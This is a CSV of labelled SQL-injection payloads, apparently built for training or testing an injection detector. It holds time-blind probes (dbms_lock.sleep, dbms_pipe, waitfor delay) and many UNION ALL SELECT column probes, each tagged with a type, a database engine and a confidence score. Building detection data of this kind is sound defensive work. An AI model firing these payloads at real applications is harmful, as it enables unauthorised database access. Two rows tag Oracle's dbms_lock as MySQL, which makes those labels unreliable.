id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18922,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",time_blind,mysql,1.0,"Signals: 'dbms_lock', 'sleep', 'if'; Time-blind SQLi (sleep/delay function); DB: mysql",2
18927,"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
18951,"1' in boolean mode ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
18966,begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 ),time_blind,mysql,1.0,"Signals: 'dbms_lock', 'sleep', 'if'; Time-blind SQLi (sleep/delay function); DB: mysql",2
18931,1 waitfor delay '0:0:5'-- nnnp,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
18947,1' ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
18910,"-4394' ) ) union all select 3409,3409--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
18912,"-6890"" ) ) ) union all select 1115#",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
18914,"-7255' union all select 2127,2127,2127,2127,2127#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
18916,"1' in boolean mode ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
18917,"-4385%' ) ) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
18924,"-2009%' union all select 1991,1991#",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
18928,"-1620 ) ) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
18929,"1 ) where 9206 = 9206 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
18930,"-1512 union all select 9013,9013,9013,9013#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
18932,"-6662"" ) ) union all select 6755--",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
18935,"-5776%' union all select 3075,3075,3075,3075,3075--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
18936,"1' ) ) as oldh where 9551 = 9551 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
18939,"1%"" ) ) union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
18941,"1' ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
18942,"-8153' where 2436 = 2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
18948,"-8093"" ) ) as oboi where 1476 = 1476 union all select 1476,1476,1476,1476#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
18949,"-3703"" ) ) ) union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
18952,"-3130 ) union all select 1741,1741,1741,1741,1741,1741,1741,1741#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
18953,"1 ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
18954,"-5528' ) union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
18955,"-4589"" ) union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
18958,"-5130' ) ) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
18959,"-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",union_based,generic,0.7,UNION-based payload detected. Payload length: 102 chars.,2
18960,"1"" union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
18961,"1"" ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
18963,"-9661"" ) ) ) union all select 2158,2158,2158--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
18964,"1%' ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
18969,"-1949 ) as smyn where 4066 = 4066 union all select 4066,4066--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
18971,"-2028' ) ) ) union all select 8698,8698,8698,8698#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
18972,"1 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
18973,"-3852' ) union all select 3577,3577,3577,3577,3577,3577,3577,3577#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
18975,"1 ) where 5232 = 5232 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
18976,"-8943%' ) union all select 7710,7710#",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
18977,"1%' union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
18978,"-5744 ) union all select 3617,3617,3617,3617,3617,3617--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
